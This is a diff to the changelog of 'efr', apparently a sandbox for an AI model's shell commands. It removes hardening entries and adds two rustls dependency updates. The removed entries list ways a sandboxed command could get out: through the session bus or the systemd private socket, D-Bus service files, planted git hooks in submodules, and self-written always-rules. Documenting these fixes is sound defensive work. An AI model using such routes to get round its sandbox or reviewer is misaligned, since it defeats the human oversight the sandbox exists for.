-  stop.
-- A process below a hidden shell or a job that declares itself a phone now gets the
-  read scope only. Before, it could approve exits.
-- A socket grant never binds the system bus, the session bus, a service manager's
-  socket (such as `systemd/private`), a container engine's socket or a desktop socket,
-  also through a link. Before, one approved socket exit for a link to the session bus
-  could reach it. Such a command now fails to start, and the sandbox says why.
-- In `auto`, the socket of a service manager, such as
-  `$XDG_RUNTIME_DIR/systemd/private`, is now a privilege exit that only you approve, as
-  a container engine's socket is. Before, the reviewer could allow it, and the command
-  could then start a unit outside the sandbox.
-- `~/.local/share/dbus-1` is now a floor: a sandboxed command cannot write it, and a
-  write there asks you. The bus starts the program of a service file there outside the
-  sandbox when a client calls its name.
-- The git guard now also checks the git dirs below a dir that an approved write
-  opened, also through a link, and the git dir of a repository when the write opened a
-  dir in it, such as `.git/hooks`. Before, a command that you or the reviewer allowed
-  to write to a repository that is not a project could plant git hooks there.
-- The hooks and config of a git submodule (`.git/modules/<name>`, also a name with `/`
-  such as `vendor/foo`, and a submodule of a submodule) stay read-only in the sandbox,
-  as the project's own do. Before, only the first level below `.git/modules` was
-  read-only. A relative `core.hooksPath` of a submodule is now read-only in the
-  submodule's own dir. After each command, the git guard also checks these submodules,
-  the git dir that a `.git` file names, and the include files and the `core.hooksPath`
-  dir that the config of each checked repository names.
-- With `dbus.proxy = true`, the bus filter of a command runs in its own Landlock
-  domain with no TCP, a seccomp filter and an fd limit: it reads only its program and
-  libraries, connects only to the two real buses, and makes its sockets only in the
-  command's bus dir. Each command gets its own filter, which ends with the command. A
-  filter that cannot start fails the command; the command never gets the whole bus
-  instead. A bug in the filter itself still reaches your bus rights.
-- An always rule never covers a privilege, persistence, upload, desktop, masked-read or
-  synced-folder exit, never runs a command outside the sandbox, never names a floor,
-  efr's own dirs or a secret, never covers a dir above a floor, a write in a floor or in
-  a `.git` dir, or a path through a link, and never beats a `deny` or `ask` rule or
-  `network.deny`. Only an answer in your own terminal saves a rule; efr never writes one
-  for a phone or the model. Any program of yours that can write `config.toml` can still
-  add one.
 - efr redacts more kinds of tokens from the last command and the recent commands that
   go to the model: AWS, Slack, GitLab, Google, npm, Hugging Face and PyPI keys, JSON
   web tokens, and long random words of upper and lower case letters and digits. Git
   ids, sha256 sums and paths stay. A key of only lower case hex stays visible.
+- efr now uses rustls 0.23.46 for its connections to the provider. This version fixes
+  four advisories of rustls 0.23.45 (RUSTSEC-2026-0346 to RUSTSEC-2026-0349).
+- efr now uses rustls-webpki 0.103.16, which rustls uses to check certificates. This
+  version fixes the advisory RUSTSEC-2026-0382 of rustls-webpki 0.103.15.
 
 ## [0.0.3] - 2026-10-09
 
